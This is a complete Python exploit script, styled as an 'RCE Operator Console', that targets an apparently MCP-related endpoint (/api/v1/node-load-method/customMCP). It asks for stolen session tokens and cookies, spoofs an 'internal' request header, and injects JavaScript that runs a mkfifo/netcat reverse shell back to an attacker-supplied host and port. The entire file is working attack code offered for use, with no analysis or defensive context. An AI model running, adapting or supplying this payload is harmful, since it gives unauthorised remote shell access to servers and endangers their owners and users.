#!/usr/bin/env python3
# =========================================================
#  MAVERICK-VF142 | Silentium RCE Exploit (Interactive)
# =========================================================

import requests

BANNER = r"""
███╗   ███╗ █████╗ ██╗   ██╗███████╗██████╗ ██╗ ██████╗██╗  ██╗
████╗ ████║██╔══██╗██║   ██║██╔════╝██╔══██╗██║██╔════╝██║ ██╔╝
██╔████╔██║███████║██║   ██║█████╗  ██████╔╝██║██║     █████╔╝ 
██║╚██╔╝██║██╔══██║╚██╗ ██╔╝██╔══╝  ██╔══██╗██║██║     ██╔═██╗ 
██║ ╚═╝ ██║██║  ██║ ╚████╔╝ ███████╗██║  ██║██║╚██████╗██║  ██╗
╚═╝     ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚═╝ ╚═════╝╚═╝  ╚═╝

        MAVERICK-VF142 | RCE Operator Console
"""

def get_input(prompt, required=True):
    while True:
        value = input(f"{prompt}: ").strip()
        if value or not required:
            return value
        print("[!] Required field. Don’t leave it blank.")

def build_payload(lhost, lport):
    return {
        "loadMethod": "listActions",
        "inputs": {
            "mcpServerConfig": f"""({{x:(function(){{
                const cp = process.mainModule.require("child_process");
                cp.execSync("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f");
                return 1;
            }})()}})"""
        }
    }

def main():
    print(BANNER)

    target = get_input("Target URL (http://...)")
    token = get_input("JWT Token")
    refresh = get_input("Refresh Token")
    sid = get_input("connect.sid")
    lhost = get_input("LHOST")
    lport = get_input("LPORT")

    url = f"{target}/api/v1/node-load-method/customMCP"

    headers = {
        "Content-Type": "application/json",
        "x-request-from": "internal",
        "Cookie": f"token={token};refreshToken={refresh};connect.sid={sid}"
    }

    payload = build_payload(lhost, lport)

    print("\n[>] Launching payload...")
    print(f"[>] Target: {url}")
    print(f"[>] Callback: {lhost}:{lport}")

    try:
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        print(f"[+] Response Code: {r.status_code}")
        print(r.text)
    except Exception as e:
        print(f"[!] Exploit failed: {e}")

    print("\n[!] If no shell, your assumptions are wrong. Fix them.")

if __name__ == "__main__":
    main()
